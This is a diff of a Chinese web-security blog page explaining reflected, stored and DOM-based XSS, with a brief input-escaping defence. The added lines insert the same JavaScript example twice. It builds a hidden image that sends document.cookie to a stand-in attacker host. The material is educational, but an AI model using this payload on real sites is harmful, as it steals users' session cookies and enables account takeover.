@@ -60,7 +60,7 @@ SQL注入攻击
 
 ##XSS
 以下内容节">
-<meta property="og:updated_time" content="2017-03-19T15:48:15.000Z">
+<meta property="og:updated_time" content="2017-03-21T05:25:52.708Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="web安全漏洞">
 <meta name="twitter:description" content="web安全漏洞今天就来谈一下web开发的时候要注意哪些安全漏洞，了解这方面知识首推两本书，《白帽子讲web安全》和《web之困》。下面列出常见的web攻击
@@ -153,12 +153,17 @@ SQL注入攻击
 <p><em>以下内容节选自《白帽子讲web安全》</em></p>
 <blockquote>
 <p>跨站脚本攻击，全称是Cross Site Script，本来缩写是css，但是为了和样式表有所区别，所以在安全领域叫做“xss”。XSS攻击，通常指黑客通过”HTML注入”篡改了网页，插入了恶意的脚本，蓉儿在用户浏览网页时，控制用户浏览器的一种攻击。<br><br>XSS有三种类型<br>第一种类型：</p>
-<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS只是简单地把用户输入的数据“反射“到浏览器，也就是说，黑客往往需要有使用户”点击”一个恶意链接，才能攻击成功。反射型XSS也叫做”非持久型XSS”<br>这段话看起来比较复杂，其实反射型XSS的实现比较简单。攻击成功有个前提，所在网页有脚本从URL获取信息的，例如有时候跨域传送消息会使用location.hash，这时候如果在hash里面插入JavaScript语句，那么脚本在获取信息的时候就会执行恶意语句，从而导致用户信息外泄。</p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS只是简单地把用户输入的数据“反射“到浏览器，也就是说，黑客往往需要有使用户”点击”一个恶意链接，才能攻击成功。反射型XSS也叫做”非持久型XSS”<br>这段话看起来比较复杂，其实反射型XSS的实现比较简单。攻击成功有个前提，所在网页有脚本从URL获取信息的，例如有时候跨域传送消息会使用location.hash，这时候如果在hash里面插入JavaScript语句，那么脚本在获取信息的时候就会执行恶意语句，从而导致用户信息外泄。<br><em>例子</em></p>
+<ol>
+<li>先写一个站点会直接把发送的value直接写入到返回的body中</li>
+<li>构造恶意代码，可以用document.cookie获取cookie<figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//输入框中输入这段代码，由于后台会把输入的值直接返回，那么久这段代码就会被执行</span></div><div class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</div><div class="line">img.src=<span class="string">'http://www.xss.com?cookie='</span>+<span class="built_in">document</span>.cookie;</div><div class="line">img.style.display=<span class="string">'none'</span>;</div><div class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(img);</div></pre></td></tr></table></figure>
+</li>
+</ol>
 </blockquote>
 <p>防御方法：对从URL或者用户输入中获取的信息进行字符校验，当检测到JavaScript关键字，html标签符号时对其进行移除或者转义。</p>
 <p>第二种类型:</p>
 <h3 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h3><blockquote>
-<p>存储型XSS会把用户输入的数据”存储”在服务器端。这种XSS具有很强的稳定性。比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。<strong>黑客把恶意的脚本保存到服务器端</strong>，所以这种XSS攻击就叫做”存储型XSS”</p>
+<p>存储型XSS会把用户输入的数据”存储”在服务器端。这种XSS具有很强的稳定性。比较常见的一个场景就是，黑客写下一篇包含有恶意JavaScript代码的博客文章，文章发表后，所有访问该博客文章的用户，都会在他们的浏览器中执行这段恶意的JavaScript代码。<strong>黑客把恶意的脚本保存到服务器端</strong>，所以这种XSS攻击就叫做”存储型XSS”<br><em>例子</em><br><figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//文章中加入下列字段，由于图片是不可视的所以用户完全不会有任何感觉</span></div><div class="line"><span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</div><div class="line">img.src=<span class="string">'http://www.xss.com?cookie='</span>+<span class="built_in">document</span>.cookie;</div><div class="line">img.style.display=<span class="string">'none'</span>;</div><div class="line"><span class="built_in">document</span>.getElementsByTagName(<span class="string">'body'</span>)[<span class="number">0</span>].appendChild(img);</div></pre></td></tr></table></figure></p>
 </blockquote>
 <p>第三种类型：</p>
 <h3 id="DOM-Based-XSS"><a href="#DOM-Based-XSS" class="headerlink" title="DOM Based XSS"></a>DOM Based XSS</h3><blockquote>
